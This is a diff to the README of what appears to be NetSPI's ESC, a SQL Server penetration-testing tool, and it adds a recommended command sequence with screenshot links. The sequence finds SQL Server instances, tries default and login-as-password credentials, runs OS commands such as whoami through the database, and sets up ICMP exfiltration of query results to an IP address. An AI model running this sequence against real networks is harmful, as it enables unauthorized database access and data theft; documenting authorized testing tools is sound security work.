@@ -188,18 +188,51 @@ Below are some quick instructions for running ESC functions through PowerShell.
  ### Recommended Command Sequence <a name="recommendcommands"></a>
  Below is a recommended command sequence for those of you who want to quickly discover SQL Server instances and determine which ones you have immediate access to.
  <pre>
- discover domainspn 
- discover broadcast
- show discovered
- set targetall enabled
- show settings
- check access
- check defaultpw
- check loginaspw
- show access
- export discovered c:\temp\discovered.csv
- export access c:\temp\access.csv
- export access c:\temp\access.csv instance
+ `discover domainspn`
+ ![examplescenario](https://github.com/NetSPI/ESC/blob/master/screenshots/Discovery-DomainSPN.png)<br>
+ 
+ `discover broadcast`
+ ![examplescenario](https://github.com/NetSPI/ESC/blob/master/screenshots/Discovery-DomainSPN.png)<br>
+ 
+ `show discovered`
+ ![examplescenario](https://github.com/NetSPI/ESC/blob/master/screenshots/Discovery-Show.png)<br>
+ 
+` set targetall enabled`
+ ![examplescenario](https://github.com/NetSPI/ESC/blob/master/screenshots/Access-TargetAll.png)<br>
+ 
+ `show settings`
+ ![examplescenario](https://github.com/NetSPI/ESC/blob/master/screenshots/Discovery-DomainSPN.png)<br>
+ 
+ `check access`
+ ![examplescenario](https://github.com/NetSPI/ESC/blob/master/screenshots/Access-CheckAccess.png)<br>
+ 
+ `show access`
+ ![examplescenario](https://github.com/NetSPI/ESC/blob/master/screenshots/Access-ShowAccess.png)<br>
+ 
+ `check defaultpw`
+ ![examplescenario](https://github.com/NetSPI/ESC/blob/master/screenshots/Discovery-DomainSPN.png)<br>
+ 
+ `check loginaspw`
+ ![examplescenario](https://github.com/NetSPI/ESC/blob/master/screenshots/Discovery-DomainSPN.png)<br>
+ 
+ `run oscmd whoami`
+ ![examplescenario](https://github.com/NetSPI/ESC/blob/master/screenshots/RunOsCmd1.png)<br>
+ 
+ `show access`
+ ![examplescenario](https://github.com/NetSPI/ESC/blob/master/screenshots/Access-ShowAccess2.png)<br>
+ 
+ `export access c:\temp\access.csv`
+ ![examplescenario](https://github.com/NetSPI/ESC/blob/master/screenshots/AccessExport1.png)<br>
+ ![examplescenario](https://github.com/NetSPI/ESC/blob/master/screenshots/AccessExport2.png)<br>
+ 
+ `set icmp enabled`
+ ![examplescenario](https://github.com/NetSPI/ESC/blob/master/screenshots/IcmpExfil1.png)<br>
+ 
+ `set icmpip 192.168.1.1`
+ ![examplescenario](https://github.com/NetSPI/ESC/blob/master/screenshots/IcmpExfil12.png)<br>
+ 
+ `select @@version`
+ ![examplescenario](https://github.com/NetSPI/ESC/blob/master/screenshots/IcmpExfil3.png)<br>
  </pre>
  
  # Pending Commands <a name="pendingcommands"></a>
